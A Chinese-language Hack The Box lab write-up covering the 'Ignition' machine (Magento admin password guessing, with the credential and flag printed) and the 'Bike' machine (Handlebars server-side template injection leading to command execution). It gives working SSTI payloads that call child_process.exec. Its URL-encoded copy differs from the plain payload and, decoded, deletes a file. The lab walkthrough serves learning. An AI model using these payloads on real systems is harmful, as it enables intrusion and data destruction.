+</p><p id="b8546e34-9b54-4b7d-a05a-6280b52a5cb7" class="">重新產生靶機也是一樣</p><figure id="4a7f95a9-2af7-4537-9217-bce616632bab" class="image"><a href="HTB%20writeu%20673ee/Untitled%2025.png"><img style="width:576px" src="HTB%20writeu%20673ee/Untitled%2025.png"/></a></figure><p id="e4ff31d0-f953-4cb6-af9a-c9c103adaf7b" class="">
+</p><p id="2f6ad5a8-ab30-444e-b8e8-40026fb6bf49" class="">目前的情況是 nginx 會將 request 重導到無效的域名</p><p id="086226c1-ad6c-4188-af07-077c54d2b850" class="">既然不是 gTLD 而是內部域名．那也許可以試試看修改 <code>/etc/hosts</code> </p><p id="4e050f93-351a-4cae-8f53-f10f0239caea" class="">
+</p><figure id="afba4546-827c-4521-bb47-6a4412a01f12" class="image"><a href="HTB%20writeu%20673ee/Untitled%2026.png"><img style="width:970px" src="HTB%20writeu%20673ee/Untitled%2026.png"/></a></figure><p id="e11d403f-aa5a-44b6-b303-8a97ef1645cc" class="">
+</p><p id="feb4ebf7-d9e6-4b10-aa01-98f55d55e4cf" class="">終於可以正常存取頁面 (原本以為會發生無限跳轉，但 DNS 解析不等於正常訪問頁面)</p><figure id="54ac43de-a4f6-4d46-bdc2-427847a1edb9" class="image"><a href="HTB%20writeu%20673ee/Untitled%2027.png"><img style="width:3044px" src="HTB%20writeu%20673ee/Untitled%2027.png"/></a></figure><figure id="098c66f1-4ff5-42b7-8fd8-6fcbc78af48a" class="image"><a href="HTB%20writeu%20673ee/Untitled%2028.png"><img style="width:1416px" src="HTB%20writeu%20673ee/Untitled%2028.png"/></a></figure><p id="2178be7a-703f-43f8-918f-da2903368373" class="">從 logo 可以看出是常見的開源購物車系統 Magento</p><p id="0e458bb4-088c-4f5b-9bb2-0475473cac3c" class="">
+</p><figure id="fe850c1e-7ee1-4a59-8d64-81592028ec0b" class="image"><a href="HTB%20writeu%20673ee/Untitled%2029.png"><img style="width:384px" src="HTB%20writeu%20673ee/Untitled%2029.png"/></a></figure><p id="30d559d3-92ea-4868-bf32-f64868e123ed" class="">
+</p><p id="c5882b99-7bc5-4eed-8642-91aeb3a3cba2" class="">依照慣例，猜猜看後台路徑</p><pre id="92459548-858d-4508-850e-65fa40ccf759" class="code"><code>http://ignition.htb/admin</code></pre><figure id="be69a374-f76a-4f1c-aa64-81420c027384" class="image"><a href="HTB%20writeu%20673ee/Untitled%2030.png"><img style="width:384px" src="HTB%20writeu%20673ee/Untitled%2030.png"/></a></figure><p id="26c684bd-46d7-4c2b-94f0-6254a8ad6359" class="">
+</p><p id="d66a0a22-c774-4c0b-87bc-1371dd9781dc" class="">找預設帳密的話可以用以下方式:</p><ol type="1" id="720612cc-1a06-4ee2-8315-42bd6b7629a4" class="numbered-list" start="1"><li>懶人 google 一下可以發現預設帳密資訊 (要留意版本)</li></ol><figure id="8f6fdeef-bdf1-49ed-857e-bdf4e2cc05e4" class="image"><a href="HTB%20writeu%20673ee/Untitled%2031.png"><img style="width:624px" src="HTB%20writeu%20673ee/Untitled%2031.png"/></a></figure><ol type="1" id="3ebb1ca7-722c-4c91-a337-d55d35cd3b43" class="numbered-list" start="1"><li>自己去下載一套來架設就知道了</li></ol><ol type="1" id="deb8f993-d1df-42ff-9857-c5b1382ef57c" class="numbered-list" start="3"><li>搜尋專案的 source code 和文件，但這邊只找到單元測試用的密碼資訊 (當然這部分還有更多地方可以找)</li></ol><figure id="47bea64c-d057-4014-8637-23604a360102" class="image"><a href="HTB%20writeu%20673ee/Untitled%2032.png"><img style="width:576px" src="HTB%20writeu%20673ee/Untitled%2032.png"/></a></figure><p id="4eb5d64c-7212-4a1b-a16d-3b6d7c68461c" class="">
+</p><p id="819b4b34-fda0-4c3b-8ee4-43f81754c0fa" class="">試試看 admin:123123，果然沒辦法，而且還無法用工具 try，因為會上鎖，真是太無情了</p><figure id="1c7d54f2-4c31-472c-821b-3c7fd9c2b11f" class="image"><a href="HTB%20writeu%20673ee/Untitled%2033.png"><img style="width:336px" src="HTB%20writeu%20673ee/Untitled%2033.png"/></a></figure><p id="18dca257-5b58-45a6-8d41-e069f1035ae1" class="">
+</p><p id="1f804c93-83f2-47e3-8b34-1a4f9790abfd" class="">只好參考官方 writeup，他們的思路是用猜的，但是要盡量縮小範圍 (密碼限制)</p><p id="531db5bd-4612-4f65-8022-9994256fdb16" class="">word list 則是使用常用清單</p><p id="4141be41-1288-4519-be77-7a34d12b6ddb" class="">Most Common Passwords 2022 - Is Yours on the List? | CyberNews
+<a href="https://cybernews.com/best-password-managers/most-common-passwords/">https://cybernews.com/best-password-managers/most-common-passwords/</a></p><p id="83a87353-f01d-40eb-92a3-11efe8b7696e" class="">
+</p><p id="ed68a0ea-3a73-4d74-9e68-8bf62bde2aa4" class="">根據建立帳號頁面的提示可以知道密碼限制 (不過有些時候管理員或初始化時的密碼不會被限制)</p><pre id="027dcac5-1f72-441b-86d8-33e0e656f706" class="code"><code>Minimum length of this field must be equal or greater than 8 symbols. Leading and trailing spaces will be ignored.</code></pre><figure id="cfc2e99f-f742-49c2-bd68-9d4e7e52f3ee" class="image"><a href="HTB%20writeu%20673ee/Untitled%2034.png"><img style="width:1364px" src="HTB%20writeu%20673ee/Untitled%2034.png"/></a></figure><p id="5955f7a3-46df-4454-8180-bb5b1f9c2bcb" class="">
+</p><p id="72447287-3157-4678-a2b7-0d2c66d2e79b" class="">根據以上限制從常用密碼列表中過濾出以下組合</p><p id="afcddda4-898c-49fd-a4b7-e947a0bf7d36" class="">帳號則是一樣猜 admin，接下來就是慢慢 try</p><pre id="bdf68fc0-c3b8-4852-98b9-0543d2eac30b" class="code"><code>admin admin123
+admin root123
+admin password1
+admin administrator1
+admin changeme1
+admin password123
+admin qwerty123
+admin administrator123
+admin changeme123</code></pre><h3 id="89c22ffa-f05d-4fd5-bde6-0b3409d177c0" class="">flag</h3><pre id="d2846893-9868-4c41-98c0-8497fcaeb9e7" class="code"><code>admin:qwerty123</code></pre><figure id="7118b19b-80e1-4d8b-a7e5-135d4535568b" class="image"><a href="HTB%20writeu%20673ee/Untitled%2035.png"><img style="width:480px" src="HTB%20writeu%20673ee/Untitled%2035.png"/></a></figure><pre id="c6efdd9c-86f3-437d-954e-1b0eaa71edde" class="code"><code>797d6c988d9dc5865e010b9410f247e0</code></pre><p id="df3d5bf1-88d7-42d9-b760-32fbeee65de1" class=""><a href="https://www.hackthebox.com/achievement/machine/929350/405">https://www.hackthebox.com/achievement/machine/929350/405</a></p><hr id="cc451c9b-279f-4461-a966-a20685d964f9"/><h1 id="c13e2519-c62c-47fd-9c42-3f6c3b601be3" class="">🚴‍♂️  Bike (Server Side Template Injection)</h1><p id="e2b6ea83-fb5f-4f35-ac67-3e3c7193ddb3" class="">這題主要是讓你練習 SSTI ，因為最後可以 RCE，所以也可以把網站下載下來帶回家</p><pre id="344b4c3c-5ba2-40df-a357-6fad7444caf3" class="code code-wrap"><code>10.129.97.64</code></pre><p id="8ae1951d-541f-46aa-849f-7fedd79c8419" class="">
+</p><h3 id="92566880-a606-4972-8722-7c41a4c12c12" class="">recon</h3><p id="c1b0d939-6577-4ab7-bad2-60dc61febd84" class="">照慣例先掃描</p><pre id="18f4b2ad-24f5-4601-8ddf-87af5ae4d72f" class="code code-wrap"><code>nmap -A 10.129.97.64</code></pre><pre id="921216a9-42ce-489e-981a-36558973bc78" class="code code-wrap"><code>Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-04 13:38 CST
+Nmap scan report for 10.129.97.64
+Host is up (0.26s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http    Node.js (Express middleware)
+|_http-title:  Bike 
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.17 seconds</code></pre><p id="198eebb1-14ec-4beb-b82e-6e423fce7078" class="">
+</p><figure id="0e3831a4-b357-470c-bf1d-f58b079d05c8" class="image"><a href="HTB%20writeu%20673ee/Untitled%2036.png"><img style="width:1344px" src="HTB%20writeu%20673ee/Untitled%2036.png"/></a></figure><p id="08fe11de-8ee3-4826-927d-83a58ac89b6c" class="">
+</p><pre id="34ae8a96-bda3-44ba-859a-3d1d58b08a2c" class="code code-wrap"><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/home.css&quot;&gt;
+    &lt;title&gt; Bike &lt;/title&gt;
+&lt;/head&gt;
+&lt;header&gt;
+
+&lt;/header&gt;
+
+&lt;body&gt;
+    &lt;div id=container&gt;
+  &lt;img
+    src=&quot;images/buttons.gif&quot;
+    id=&quot;avatar&quot;&gt;
+  &lt;div class=&quot;type-wrap&quot;&gt;
+    &lt;span id=&quot;typed&quot; style=&quot;white-space:pre;&quot; class=&quot;typed&quot;&gt;&lt;/span&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;contact&quot;&gt;
+    &lt;h3&gt;We can let you know once we are up and running.&lt;/h3&gt;
+    &lt;div class=&quot;fields&quot;&gt;
+      &lt;form id=&quot;form&quot; method=&quot;POST&quot; action=&quot;/&quot;&gt;
+        &lt;input name=&quot;email&quot; placeholder=&quot;E-mail&quot;&gt;&lt;/input&gt;
+        &lt;button type=&quot;submit&quot; class=&quot;button-54&quot; name=&quot;action&quot; value=&quot;Submit&quot;&gt;Submit&lt;/button&gt;
+      &lt;/form&gt;
+    &lt;/div&gt;
+    &lt;p class=&quot;result&quot;&gt;
+    &lt;/p&gt;
+&lt;/div&gt;
+    &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;js/typed.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;js/main.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;</code></pre><figure id="10dc4f65-ffb3-4af2-ba40-04d2c4aa1e1a" class="image"><a href="HTB%20writeu%20673ee/Untitled%2037.png"><img style="width:336px" src="HTB%20writeu%20673ee/Untitled%2037.png"/></a></figure><p id="b11d88e1-8cfa-4a23-8a9d-cfdef9c12046" class="">
+</p><p id="79c6cc83-c9ba-49b0-8de9-9a3f800b3dae" class="">email 欄位就是我們要開始測試的地方</p><figure id="a7fdb018-e520-40ac-ae21-b95333ac5b49" class="image"><a href="HTB%20writeu%20673ee/Untitled%2038.png"><img style="width:1602px" src="HTB%20writeu%20673ee/Untitled%2038.png"/></a></figure><p id="de01d489-a9ca-42f3-9598-04208bdd0469" class="">
+</p><h2 id="b6aaaa21-0659-4c40-a418-9b18d458e4f3" class="">template injection</h2><h3 id="93fa1be3-5e30-443e-8b48-691272442899" class="">簡單判斷是哪種 template engine </h3><p id="47113a17-8f17-4af0-aba1-42cf9c6e2193" class="">HackTricks 上有一張用來判斷 template engine 種類的參考圖</p><p id="a89aa99b-af1f-4cfb-8108-d799ff1563fb" class="">再發現 SSTI 時可以先用簡單的 payload 來測試一下</p><figure id="6bcb5b3c-16d4-4a0c-8958-7404740ac1ab" class="image"><a href="HTB%20writeu%20673ee/Untitled%2039.png"><img style="width:640px" src="HTB%20writeu%20673ee/Untitled%2039.png"/></a></figure><p id="1663b86b-c374-4652-bd44-41b59ba0ac56" class="">
+</p><p id="ae5c3776-952b-455a-b000-bbef7dfabc86" class="">也可以先試圖讓 template engine 噴錯，可以直接看到後端技術的資訊</p><pre id="f5729091-f394-4021-947c-cdca4719a7d7" class="code code-wrap"><code>{{ &#x27;{ }}</code></pre><figure id="5aa344be-0822-44c1-be42-2f6d204e83b3" class="image"><a href="HTB%20writeu%20673ee/Untitled%2040.png"><img style="width:1738px" src="HTB%20writeu%20673ee/Untitled%2040.png"/></a></figure><pre id="a0fdb3f8-850e-43a8-8179-5848767279dc" class="code code-wrap"><code>Error: Parse error on line 1:
+{{&#x27;{}}
+--^
+Expecting &#x27;ID&#x27;, &#x27;STRING&#x27;, &#x27;NUMBER&#x27;, &#x27;BOOLEAN&#x27;, &#x27;UNDEFINED&#x27;, &#x27;NULL&#x27;, &#x27;DATA&#x27;, got &#x27;INVALID&#x27;
+    at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)
+    at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)
+    at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)
+    at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)
+    at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)
+    at router.post (/root/Backend/routes/handlers.js:14:16)
+    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)
+    at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)
+    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)</code></pre><p id="37cfeae8-95d8-43af-b6ba-7b57320ddcef" class="">
+</p><p id="0599b5f4-b354-4663-86c7-8c345a15c039" class="">從錯誤資訊可以得知它預期的資料型態</p><pre id="4483590f-eb10-4b89-9a4c-967c0f3be7b6" class="code code-wrap"><code>Expecting &#x27;ID&#x27;, &#x27;STRING&#x27;, &#x27;NUMBER&#x27;, &#x27;BOOLEAN&#x27;, &#x27;UNDEFINED&#x27;, &#x27;NULL&#x27;, &#x27;DATA&#x27;, got &#x27;INVALID&#x27;</code></pre><p id="b07136e6-b8a7-405e-a605-889faf480dc3" class="">
+</p><p id="e8ef510b-4940-4bfc-b99f-ca320fd98714" class="">以及 server side 使用的 template engine 是 handlebars</p><pre id="48e06e10-b920-4545-b9f6-fc0a59112b6e" class="code code-wrap"><code>at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)</code></pre><p id="8e84e8d5-cc78-4911-8c65-5c7622adb9c3" class="">
+</p><h3 id="f3742fdb-9437-44d2-8d70-5d779e936639" class="">payload</h3><p id="fad4bdb0-e672-41c7-a55e-11d97a8a1649" class="">這篇 writeup 有詳細介紹 template injection 的原理和怎麼使用 payload</p><p id="7a637c74-531c-4c25-9c96-2a669724e000" class="">Handlebars template injection and RCE in a Shopify app
+<a href="http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html">http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html</a></p><p id="0c4bf1c5-f1b7-42fc-b7b0-9e780b0bd382" class="">如果要弄懂的話應該要好好讀一下，如果只是要通關，就把下面的 payload 丟過去炸應該就 ok 了</p><p id="35fda94c-e01e-4849-bcb5-78343d685b2a" class="">從目前收集到的資訊可以知道，這是一個典型的組合: nodejs + express + handlebars</p><p id="e8d270fc-4a5d-496f-9bfc-3b9d630ca4e5" class="">payload 最主要的目的是 require child process 並執行 whoami 指令的那段</p><pre id="158c7ac9-9323-43bd-9d38-24475d658c55" class="code code-wrap"><code>{{#with &quot;s&quot; as |string|}}
+  {{#with &quot;e&quot;}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub &quot;constructor&quot;)}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push &quot;return require(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;);&quot;}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}</code></pre><p id="cca7bca7-d31f-4c67-84b1-5ff554a79cbe" class="">URLencoded:</p><pre id="c166ac3d-87ef-44d3-b0b9-bb1d44fc6307" class="code code-wrap"><code>%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d</code></pre><p id="314c6f64-2f71-4353-b056-bc13342fecf2" class="">
+</p><p id="97940636-0191-4f01-b4bd-920d899f0bc3" class="">丟過去後出現 require is not defined，why ?</p><figure id="eb641f8a-94d6-425f-ab7e-9a6345ef9fbd" class="image"><a href="HTB%20writeu%20673ee/Untitled%2041.png"><img style="width:2676px" src="HTB%20writeu%20673ee/Untitled%2041.png"/></a></figure><pre id="e3c90c39-f35e-4cc3-8445-5fd6fa04d1cb" class="code code-wrap"><code>eferenceError: require is not defined
+    at Function.eval (eval at &lt;anonymous&gt; (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23)), &lt;anonymous&gt;:3:1)
+    at Function.&lt;anonymous&gt; (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:10:25)
+    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), &lt;anonymous&gt;:6:34)
+    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)
+    at execIteration (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:51:19)
+    at Array.&lt;anonymous&gt; (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:61:13)
+    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), &lt;anonymous&gt;:12:31)
+    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)
+    at Array.&lt;anonymous&gt; (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:22:14)
+    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), &lt;anonymous&gt;:12:34)</code></pre><p id="927b9118-a479-4fae-b4e0-e46c8811ea88" class="">
+</p><pre id="5a4b670d-df79-4fe6-95ee-ad6de19cbd05" class="code code-wrap"><code>{{#with &quot;s&quot; as |string|}}
+  {{#with &quot;e&quot;}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub &quot;constructor&quot;)}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push &quot;return 7*7&quot;}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}</code></pre><figure id="a25408b5-4589-4f85-a9d1-6da26eb63e9e" class="image"><a href="HTB%20writeu%20673ee/Untitled%2042.png"><img style="width:2518px" src="HTB%20writeu%20673ee/Untitled%2042.png"/></a></figure><p id="33759899-a5b8-4dbc-9b11-6a918b8f554a" class="">
+</p><pre id="63b43d0f-7dcf-4bba-b9dd-197468abc80f" class="code code-wrap"><code>{{this.push &quot;return 7*7&quot;}}</code></pre><figure id="08106bb4-675b-40b5-9233-8c877b35d842" class="image"><a href="HTB%20writeu%20673ee/Untitled%2043.png"><img style="width:2522px" src="HTB%20writeu%20673ee/Untitled%2043.png"/></a></figure><p id="1268262a-3163-4324-b1f6-f1df646d8534" class="">
+</p><p id="b53d9bc5-a8c9-4443-99d4-e15783026c75" class="">不過我們可以先試著執行看看其他內容，例如順便查一下 node version</p><pre id="417b534d-8305-45de-a68a-ba5118973a6d" class="code code-wrap"><code>{{#with &quot;s&quot; as |string|}}
+  {{#with &quot;e&quot;}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub &quot;constructor&quot;)}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push &quot;return process.version&quot;}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}</code></pre><figure id="dc9d05ea-2555-4e01-bd12-deaf94eac3f3" class="image"><a href="HTB%20writeu%20673ee/Untitled%2044.png"><img style="width:2510px" src="HTB%20writeu%20673ee/Untitled%2044.png"/></a></figure><pre id="821f5431-8e80-4af9-bddd-fcd0b22dbe32" class="code code-wrap"><code>We will contact you at:                e       2       [object Object]                function Function() { [native code] }         2         [object Object]                                 v10.19.0</code></pre><h3 id="e3265414-94e1-476d-abd4-80f60e551892" class="">template engine in sandbox</h3><blockquote id="6a53a7b4-a096-416c-adbe-bca15561d731" class="">Template Engines are often Sandboxed, meaning their code runs in a restricted code space so that in the event of malicious code being run, it will be very hard to load modules that can run system commands. If we cannot directly use require to load such modules, we will have to find a different way.</blockquote><p id="64ca5611-084b-47a3-9292-8e9d6a9eabee" class="">
+</p><p id="8cd3b487-2304-4fa7-bafe-346b54b30308" class="">卡關，參考官方 writeup 上的解釋，原因是沙盒的關係，所以無法使用 require or import</p><p id="f18dd7ec-49b5-4bef-8b53-b7bc1afa9a81" class="">因此這邊的思路就是要你去思考，除了透過 require 來引入 child process lib 以執行指令之外，還有沒有別的方式也能達到相同或類似的目的</p><p id="a8cc1b28-539c-4c9b-ba88-31289627e048" class="">
+</p><p id="838175e8-13a0-4eba-8e3c-bcabeea496fb" class="">進入 nodejs 的 repl (建議用跟目標環境相同的 node 版本) ，輸入 global 會發現其實可以透過它來存取</p><pre id="86196ada-3ebe-4da1-93f0-be5828935bac" class="code code-wrap"><code>&gt; global.child_press
+{
+  _forkChild: [Function: _forkChild],
+  ChildProcess: [Function: ChildProcess],
+  exec: [Function: exec],
+  execFile: [Function: execFile],
+  execFileSync: [Function: execFileSync],
+  execSync: [Function: execSync],
+  fork: [Function: fork],
+  spawn: [Function: spawn],
+  spawnSync: [Function: spawnSync]
+}</code></pre><figure id="1a9fa369-1aee-47a2-9807-85bdd4e7c8da" class="image"><a href="HTB%20writeu%20673ee/Untitled%2045.png"><img style="width:432px" src="HTB%20writeu%20673ee/Untitled%2045.png"/></a></figure><p id="90aeaf3f-bb7b-4af7-845e-6fc942c8295f" class="">
+</p><figure id="804f75ac-c8ee-42f3-b228-099117804f9d"><a href="https://nodejs.org/api/process.html#processmainmodule" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Process | Node.js v17.6.0 Documentation</div><div class="bookmark-description">The &#x27;beforeExit&#x27; event is emitted when Node.js empties its event loop and has no additional work to schedule. Normally, the Node.js process will exit when there is no work scheduled, but a listener registered on the&#x27;beforeExit&#x27; event can make asynchronous calls, and thereby cause the Node.js process to continue.</div></div><div class="bookmark-href"><img src="https://nodejs.org/favicon.ico" class="icon bookmark-icon"/>https://nodejs.org/api/process.html#processmainmodule</div></div></a></figure><figure id="0e70241b-4b34-4628-a6bf-70cebcaf55b0" class="image"><a href="HTB%20writeu%20673ee/Untitled%2046.png"><img style="width:2026px" src="HTB%20writeu%20673ee/Untitled%2046.png"/></a></figure><blockquote id="09b4d6c6-df27-46ae-9cb8-2c2d96a6dbde" class="">As with require.main, process.mainModule will be undefined if there is no entry script.</blockquote><p id="371e8cfe-610d-42be-9dda-9e1f23217d63" class="">⚠️ 如果使用 nodejs 的 repl 是看不到 process.mainModule 這個屬性的</p><p id="f1e99c12-8d33-475c-8bf5-9487940e71a0" class="">
+</p><pre id="1901163e-1727-4bcb-9d36-6565b8b6aaff" class="code code-wrap"><code>console.log(process.mainModule)</code></pre><div id="34657c7f-fddb-440d-a7d5-baaec49993a0" class="column-list"><div id="a52470bd-bfee-430b-94c8-c40e0bc40bf2" style="width:50%" class="column"><pre id="c46101f6-ecb5-4ec3-a464-5febb54c33fc" class="code code-wrap"><code>❯ node test.js
+Module {
+  id: &#x27;.&#x27;,
+  exports: {},
+  parent: null,
+  filename: &#x27;/private/tmp/test.js&#x27;,
+  loaded: false,
+  children: [],
+  paths:
+   [ &#x27;/private/tmp/node_modules&#x27;,
+     &#x27;/private/node_modules&#x27;,
+     &#x27;/node_modules&#x27; ] }</code></pre></div><div id="eefd5946-c90a-4878-b226-099de6535b75" style="width:50%" class="column"><figure id="91715033-81f5-405d-b4cc-156eaedef8c3" class="image"><a href="HTB%20writeu%20673ee/Untitled%2047.png"><img style="width:732px" src="HTB%20writeu%20673ee/Untitled%2047.png"/></a></figure></div></div><p id="6f2e585e-22e8-42c1-bac0-11120a2a2f30" class="">
+</p><pre id="bf72ad27-a182-4a65-bdc6-95120005fa49" class="code code-wrap"><code>console.log(process.mainModule.require(&#x27;child_process&#x27;))</code></pre><div id="7516d81d-c00b-4f9c-8a85-59a9b32445e1" class="column-list"><div id="aefaa1b4-2cab-48b0-b177-a8ade1ae9d8b" style="width:50%" class="column"><pre id="6f16cda0-4375-4def-94e4-8d1acfef0311" class="code code-wrap"><code>node test.js
+{ ChildProcess:
+   { [Function: ChildProcess]
+     super_:
+      { [Function: EventEmitter]
+        once: [Function: once],
+        EventEmitter: [Circular],
+        usingDomains: false,
+        defaultMaxListeners: [Getter/Setter],
+        init: [Function],
+        listenerCount: [Function] } },
+  fork: [Function: fork],
+  _forkChild: [Function: _forkChild],
+  exec: [Function: exec],
+  execFile: [Function: execFile],
+  spawn: [Function: spawn],
+  spawnSync: [Function: spawnSync],
+  execFileSync: [Function: execFileSync],
+  execSync: [Function: execSync] }</code></pre></div><div id="e90257d0-007b-4f78-8220-8b414ad44d70" style="width:50%" class="column"><figure id="a63b3bd1-d51e-4995-836a-add9af02b681" class="image"><a href="HTB%20writeu%20673ee/Untitled%2048.png"><img style="width:906px" src="HTB%20writeu%20673ee/Untitled%2048.png"/></a></figure></div></div><p id="16728df5-9e28-452a-aae6-a2c93787275c" class="">
+</p><p id="6dc9d09f-f34e-48ae-987d-a822372904d1" class="">exec 是非同步輸出，所以會比較麻煩，在某些場景可能不會正常輸出</p><pre id="8210b87a-6813-4203-94da-914284b0d1a0" class="code code-wrap"><code>require(&#x27;child_process&#x27;).exec(&quot;whoami&quot;, (err, stdout)=&gt; { console.log(stdout) })</code></pre><p id="0ee25c24-92e6-40a2-ae85-e746ab4dd120" class="">
